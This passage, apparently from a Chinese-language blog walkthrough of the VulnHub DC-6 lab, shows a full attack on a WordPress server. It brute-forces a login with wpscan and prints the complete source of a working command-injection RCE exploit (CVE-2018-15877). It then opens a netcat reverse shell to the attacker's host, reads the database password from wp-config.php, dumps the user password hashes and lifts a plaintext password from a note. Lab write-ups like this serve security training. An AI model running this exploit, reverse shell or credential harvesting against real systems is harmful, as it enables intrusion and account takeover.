<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]<br>└─$ sudo wpscan --url http://wordy -U username -P passwords.txt <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.22</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] URL: http://wordy/ [192.168.56.115]</span><br><span class="hljs-string">[+] Started: Sat Jun  3 14:56:04 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">......</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Performing password attack on Xmlrpc against 5 user/s</span><br><span class="hljs-string">[SUCCESS] - mark / helpdesk01                                                                                                </span><br><span class="hljs-string">Trying jens / !lak019b Time: 00:04:24 &lt;======================================         &gt; (12547 / 15215) 82.46%  ETA: ??:??:??</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] Valid Combinations Found:</span><br><span class="hljs-string"> | Username: mark, Password: helpdesk01</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Sat Jun  3 15:00:32 2023</span><br><span class="hljs-string">[+] Requests Done: 12687</span><br><span class="hljs-string">[+] Cached Requests: 38</span><br><span class="hljs-string">[+] Data Sent: 6.214 MB</span><br><span class="hljs-string">[+] Data Received: 7.403 MB</span><br><span class="hljs-string">[+] Memory used: 289.926 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:04:28</span><br></code></pre></td></tr></table></figure>

<p>发现了mark的密码helpdesk01。</p>
<h3 id="后台拿shell"><a href="#后台拿shell" class="headerlink" title="后台拿shell"></a>后台拿shell</h3><p>登进来后台看了看，因为mark这个用户不是admin，所以我们不能操作我们最喜欢的plugin以及theme模块。那到底哪里有上传点呢？</p>
<p>我们四处观察了一下，tools里面啥也没有，侧边栏里面就剩下一个Activity monitor比较可疑了。</p>
<p class='item-img' data-src='/pic/assets/dc-6-backend.png'><img src="/pic/assets/dc-6-backend.png" alt="dc-6-backend"></p>
<p>我们都知道wordpress里的好多插件或工具有可能存在漏洞，那我们就去搜一下吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]<br>└─$ searchsploit wordpress activity monitor<br>------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                             |  Path<br>------------------------------------------------------------------------------------------- ---------------------------------<br>WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection   | php/webapps/45274.html<br>WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authen | php/webapps/50110.py<br>------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>

<p>我们惊喜的发现真的有。那我们直接下载下来。下面附上50110.py的源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python">┌──(kali㉿kali)-[~/vulnhub/DC/<span class="hljs-number">6</span>/workSpace]<br>└─$ cat <span class="hljs-number">50110.</span>py  <br><span class="hljs-comment"># Exploit Title: WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)</span><br><span class="hljs-comment"># Date: 07.07.2021</span><br><span class="hljs-comment"># Exploit Author: Beren Kuday GORUN</span><br><span class="hljs-comment"># Vendor Homepage: https://wordpress.org/plugins/plainview-activity-monitor/</span><br><span class="hljs-comment"># Software Link: https://www.exploit-db.com/apps/2e1f384e5e49ab1d5fbf9eedf64c9a15-plainview-activity-monitor.20161228.zip</span><br><span class="hljs-comment"># Version: 20161228 and possibly prior</span><br><span class="hljs-comment"># Fixed version: 20180826</span><br><span class="hljs-comment"># CVE : CVE-2018-15877</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">-------------------------</span><br><span class="hljs-string">Usage:</span><br><span class="hljs-string">┌──(root@kali)-[~/tools]</span><br><span class="hljs-string">└─# python3 WordPress-Activity-Monitor-RCE.py</span><br><span class="hljs-string">What&#x27;s your target IP?</span><br><span class="hljs-string">192.168.101.28</span><br><span class="hljs-string">What&#x27;s your username?</span><br><span class="hljs-string">mark</span><br><span class="hljs-string">What&#x27;s your password?</span><br><span class="hljs-string">password123</span><br><span class="hljs-string">[*] Please wait...</span><br><span class="hljs-string">[*] Perfect!</span><br><span class="hljs-string">www-data@192.168.101.28  whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">www-data@192.168.101.28  pwd</span><br><span class="hljs-string">/var/www/html/wp-admin</span><br><span class="hljs-string">www-data@192.168.101.28  id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">whoami, ip</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>                cmd = <span class="hljs-built_in">input</span>(whoami+<span class="hljs-string">&quot;@&quot;</span>+ip+<span class="hljs-string">&quot;  &quot;</span>)<br>                url = <span class="hljs-string">&#x27;http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#x27;</span><br>                payload = <span class="hljs-string">&quot;google.com.tr | &quot;</span> + cmd<br>                data = &#123;<span class="hljs-string">&#x27;ip&#x27;</span>: payload , <span class="hljs-string">&#x27;lookup&#x27;</span> : <span class="hljs-string">&#x27;lookup&#x27;</span> &#125;<br>                x = requests.post(url, data = data, cookies=getCookie(ip))<br>                html_doc = x.text.split(<span class="hljs-string">&quot;&lt;p&gt;Output from dig: &lt;/p&gt;&quot;</span>)[<span class="hljs-number">1</span>]<br>                soup = BeautifulSoup(html_doc, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(soup.p.text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params">ip</span>):<br>        url = <span class="hljs-string">&#x27;http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#x27;</span><br>        myobj = &#123;<span class="hljs-string">&#x27;ip&#x27;</span>: <span class="hljs-string">&#x27;google.fr | whoami&#x27;</span>, <span class="hljs-string">&#x27;lookup&#x27;</span> : <span class="hljs-string">&#x27;lookup&#x27;</span> &#125;<br>        x = requests.post(url, data = myobj, cookies=getCookie(ip))<br>        html_doc = x.text.split(<span class="hljs-string">&quot;&lt;p&gt;Output from dig: &lt;/p&gt;&quot;</span>)[<span class="hljs-number">1</span>]<br>        soup = BeautifulSoup(html_doc, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Perfect! &quot;</span>)<br>        exploit(soup.p.text, ip)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getCookie</span>(<span class="hljs-params">ip</span>):<br>        url = <span class="hljs-string">&#x27;http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/wp-login.php&#x27;</span><br>        <span class="hljs-comment">#log=admin&amp;pwd=admin&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&amp;testcookie=1</span><br>        data = &#123;<span class="hljs-string">&#x27;log&#x27;</span>:username, <span class="hljs-string">&#x27;pwd&#x27;</span>:password, <span class="hljs-string">&#x27;wp-submit&#x27;</span>:<span class="hljs-string">&#x27;Log In&#x27;</span>, <span class="hljs-string">&#x27;testcookie&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>        x = requests.post(url, data = data)<br>        cookies = &#123;&#125;<br>        cookie = <span class="hljs-built_in">str</span>(x.headers[<span class="hljs-string">&quot;Set-Cookie&quot;</span>])<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cookie.split():<br>                <span class="hljs-keyword">if</span>(i.find(<span class="hljs-string">&quot;wordpress&quot;</span>) != -<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> i.find(<span class="hljs-string">&quot;=&quot;</span>) != -<span class="hljs-number">1</span>):<br>                        cookies[i.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">0</span>]] = i.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>][:<span class="hljs-built_in">len</span>(i.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>])-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">return</span> cookies<br><br>ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What&#x27;s your target IP?\n&quot;</span>)<br>username = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What&#x27;s your username?\n&quot;</span>)<br>password = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What&#x27;s your password?\n&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Please wait...&quot;</span>)<br>poc(ip)<br></code></pre></td></tr></table></figure>

<p>根据usage，我们尝试利用get shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]<br>└─$ python3 50110.py               <br>What<span class="hljs-string">&#x27;s your target IP?</span><br><span class="hljs-string">192.168.56.115</span><br><span class="hljs-string">What&#x27;</span>s your username?<br>mark<br>What<span class="hljs-string">&#x27;s your password?</span><br><span class="hljs-string">helpdesk01</span><br><span class="hljs-string">[*] Please wait...</span><br><span class="hljs-string">[*] Perfect! </span><br><span class="hljs-string">www-data@192.168.56.115 </span><br></code></pre></td></tr></table></figure>

<p>成功拿shell。</p>
<p>当然这个shell不是很稳定，所以我们在用nc创建一个反弹shell:<code>nc 192.168.56.144 443 -e /bin/bash</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]<br>└─$ sudo nc -lvp 443                                           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.144] from wordy [192.168.56.115] 54500<br><span class="hljs-built_in">whoami</span><br>www-data<br><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br>www-data@dc-6:/var/www/html/wp-admin$<br></code></pre></td></tr></table></figure>

<p>成功！</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h3><p>接下来就是提权。</p>
<p>喜闻乐见的就是没有www-data用户的密码无法列出可以sudo的范围。</p>
<p>令人遗憾的是也没有可用于提权的set suid位二进制文件。定时任务也是啥也没有。</p>
<h3 id="config文件"><a href="#config文件" class="headerlink" title="config文件"></a>config文件</h3><p>我们查看一下config文件，里面倒是有数据库链接密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dc-6:/var/www/html$ <span class="hljs-built_in">cat</span> wp-config.php<br><span class="hljs-built_in">cat</span> wp-config.php<br>&lt;?php<br>/**<br> * The base configuration <span class="hljs-keyword">for</span> WordPress<br> *<br> * The wp-config.php creation script uses this file during the<br> * installation. You don<span class="hljs-string">&#x27;t have to use the web site, you can</span><br><span class="hljs-string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * This file contains the following configurations:</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * * MySQL settings</span><br><span class="hljs-string"> * * Secret keys</span><br><span class="hljs-string"> * * Database table prefix</span><br><span class="hljs-string"> * * ABSPATH</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string"></span><br><span class="hljs-string">define(&#x27;</span>WP_HOME<span class="hljs-string">&#x27;,&#x27;</span>http://wordy<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>WP_SITEURL<span class="hljs-string">&#x27;,&#x27;</span>http://wordy<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">define( &#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>wordpressdb<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define( &#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>wpdbuser<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define( &#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span>meErKatZ<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL hostname */</span><br><span class="hljs-string">define( &#x27;</span>DB_HOST<span class="hljs-string">&#x27;, &#x27;</span>localhost<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-string">define( &#x27;</span>DB_CHARSET<span class="hljs-string">&#x27;, &#x27;</span>utf8<span class="hljs-string">&#x27; );</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** The Database Collate type. Don&#x27;</span>t change this <span class="hljs-keyword">if</span> <span class="hljs-keyword">in</span> doubt. */<br>define( <span class="hljs-string">&#x27;DB_COLLATE&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span> );<br></code></pre></td></tr></table></figure>

<p>登进去在wordpressdb数据库下的wp_users表中可以查到对应账户的密码。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">MariaDB [wordpressdb]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> wp_users;\g<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> wp_users;\g<br><span class="hljs-operator">+</span><span class="hljs-comment">----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+</span><br><span class="hljs-operator">|</span> ID <span class="hljs-operator">|</span> user_login <span class="hljs-operator">|</span> user_pass                          <span class="hljs-operator">|</span> user_nicename <span class="hljs-operator">|</span> user_email                  <span class="hljs-operator">|</span> user_url <span class="hljs-operator">|</span> user_registered     <span class="hljs-operator">|</span> user_activation_key                           <span class="hljs-operator">|</span> user_status <span class="hljs-operator">|</span> display_name    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> admin      <span class="hljs-operator">|</span> $P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1 <span class="hljs-operator">|</span> admin         <span class="hljs-operator">|</span> blah<span class="hljs-variable">@blahblahblah1</span>.net.au   <span class="hljs-operator">|</span>          <span class="hljs-operator">|</span> <span class="hljs-number">2019</span><span class="hljs-number">-04</span><span class="hljs-number">-24</span> <span class="hljs-number">12</span>:<span class="hljs-number">52</span>:<span class="hljs-number">10</span> <span class="hljs-operator">|</span>                                               <span class="hljs-operator">|</span>           <span class="hljs-number">0</span> <span class="hljs-operator">|</span> admin           <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">2</span> <span class="hljs-operator">|</span> graham     <span class="hljs-operator">|</span> $P$B<span class="hljs-operator">/</span>mSJ8xC4iPJAbCzbRXKilHMbSoFE41 <span class="hljs-operator">|</span> graham        <span class="hljs-operator">|</span> graham<span class="hljs-variable">@blahblahblah1</span>.net.au <span class="hljs-operator">|</span>          <span class="hljs-operator">|</span> <span class="hljs-number">2019</span><span class="hljs-number">-04</span><span class="hljs-number">-24</span> <span class="hljs-number">12</span>:<span class="hljs-number">54</span>:<span class="hljs-number">57</span> <span class="hljs-operator">|</span>                                               <span class="hljs-operator">|</span>           <span class="hljs-number">0</span> <span class="hljs-operator">|</span> Graham Bond     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">3</span> <span class="hljs-operator">|</span> mark       <span class="hljs-operator">|</span> $P$BdDI8ehZKO5B<span class="hljs-operator">/</span>cJS8H0j1hU1J9t810<span class="hljs-operator">/</span> <span class="hljs-operator">|</span> mark          <span class="hljs-operator">|</span> mark<span class="hljs-variable">@blahblahblah1</span>.net.au   <span class="hljs-operator">|</span>          <span class="hljs-operator">|</span> <span class="hljs-number">2019</span><span class="hljs-number">-04</span><span class="hljs-number">-24</span> <span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">39</span> <span class="hljs-operator">|</span>                                               <span class="hljs-operator">|</span>           <span class="hljs-number">0</span> <span class="hljs-operator">|</span> Mark Jones      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">4</span> <span class="hljs-operator">|</span> sarah      <span class="hljs-operator">|</span> $P$BEDLXtO6PUnSiB6lVaYkqUIMO<span class="hljs-operator">/</span>qx<span class="hljs-number">.3</span><span class="hljs-operator">/</span> <span class="hljs-operator">|</span> sarah         <span class="hljs-operator">|</span> sarah<span class="hljs-variable">@blahblahblah1</span>.net.au  <span class="hljs-operator">|</span>          <span class="hljs-operator">|</span> <span class="hljs-number">2019</span><span class="hljs-number">-04</span><span class="hljs-number">-24</span> <span class="hljs-number">12</span>:<span class="hljs-number">56</span>:<span class="hljs-number">10</span> <span class="hljs-operator">|</span>                                               <span class="hljs-operator">|</span>           <span class="hljs-number">0</span> <span class="hljs-operator">|</span> Sarah Balin     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">5</span> <span class="hljs-operator">|</span> jens       <span class="hljs-operator">|</span> $P$B<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">75</span>HFVPBwqsUTvkBcHA8i4DUJ7Ru0 <span class="hljs-operator">|</span> jens          <span class="hljs-operator">|</span> jens<span class="hljs-variable">@blahblahblah1</span>.net.au   <span class="hljs-operator">|</span>          <span class="hljs-operator">|</span> <span class="hljs-number">2019</span><span class="hljs-number">-04</span><span class="hljs-number">-24</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">40</span> <span class="hljs-operator">|</span> <span class="hljs-number">1556111080</span>:$P$B5<span class="hljs-operator">/</span>.DwEMzMFh3bvoGjPgnFO0Qtd3p.<span class="hljs-operator">/</span> <span class="hljs-operator">|</span>           <span class="hljs-number">0</span> <span class="hljs-operator">|</span> Jens Dagmeister <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+</span><br><span class="hljs-number">5</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>ERROR: <span class="hljs-keyword">No</span> query specified<br></code></pre></td></tr></table></figure>

<p>可惜存的都是wordpress hash后的md5值（phppass格式），破解不出来（john挂在旁边尝试到25%左右）。</p>
<p>密码复用的路就先搁置吧。</p>
<h3 id="home目录"><a href="#home目录" class="headerlink" title="home目录"></a>home目录</h3><p>这台机子是多用户环境，看看各个用户home目录里面都有啥。</p>
<p>graham和sarah目录下啥也没有。</p>
<p>jens目录下有个backup.sh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dc-6:/home/jens$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxr-xr-x 2 jens jens 4096 Apr 26  2019 .<br>drwxr-xr-x 6 root root 4096 Apr 26  2019 ..<br>-rw------- 1 jens jens    5 Apr 26  2019 .bash_history<br>-rw-r--r-- 1 jens jens  220 Apr 24  2019 .bash_logout<br>-rw-r--r-- 1 jens jens 3526 Apr 24  2019 .bashrc<br>-rw-r--r-- 1 jens jens  675 Apr 24  2019 .profile<br>-rwxrwxr-x 1 jens devs   50 Apr 26  2019 backups.sh<br>www-data@dc-6:/home/jens$ <span class="hljs-built_in">cat</span> bac<br><span class="hljs-built_in">cat</span> backups.sh <br><span class="hljs-comment">#!/bin/bash</span><br>tar -czf backups.tar.gz /var/www/html<br></code></pre></td></tr></table></figure>

<p>其操作不难理解，就是备份网页目录，可惜所有者是jens且不是定时任务。</p>
<p>那我们再看看mark</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dc-6:/home$ <span class="hljs-built_in">cd</span> mark <br><span class="hljs-built_in">cd</span> mark<br>www-data@dc-6:/home/mark$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxr-xr-x 3 mark mark 4096 Apr 26  2019 .<br>drwxr-xr-x 6 root root 4096 Apr 26  2019 ..<br>-rw------- 1 mark mark    5 Apr 26  2019 .bash_history<br>-rw-r--r-- 1 mark mark  220 Apr 24  2019 .bash_logout<br>-rw-r--r-- 1 mark mark 3526 Apr 24  2019 .bashrc<br>-rw-r--r-- 1 mark mark  675 Apr 24  2019 .profile<br>drwxr-xr-x 2 mark mark 4096 Apr 26  2019 stuff<br>www-data@dc-6:/home/mark$ <span class="hljs-built_in">cd</span> stuff<br><span class="hljs-built_in">cd</span> stuff<br>www-data@dc-6:/home/mark/stuff$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 12<br>drwxr-xr-x 2 mark mark 4096 Apr 26  2019 .<br>drwxr-xr-x 3 mark mark 4096 Apr 26  2019 ..<br>-rw-r--r-- 1 mark mark  241 Apr 26  2019 things-to-do.txt<br>www-data@dc-6:/home/mark/stuff$ <span class="hljs-built_in">cat</span> thin<br><span class="hljs-built_in">cat</span> things-to-do.txt <br>Things to <span class="hljs-keyword">do</span>:<br><br>- Restore full functionality <span class="hljs-keyword">for</span> the hyperdrive (need to speak to Jens)<br>- Buy present <span class="hljs-keyword">for</span> Sarah<span class="hljs-string">&#x27;s farewell party</span><br><span class="hljs-string">- Add new user: graham - GSo7isUM1D4 - done</span><br><span class="hljs-string">- Apply for the OSCP course</span><br><span class="hljs-string">- Buy new laptop for Sarah&#x27;</span>s replacement<br></code></pre></td></tr></table></figure>

<p>发现还是mark老哥能处，不仅网站登录密码简单，还给我们带来了新的登陆凭证 <code>graham - GSo7isUM1D4</code>。 ssh登陆一下</p>
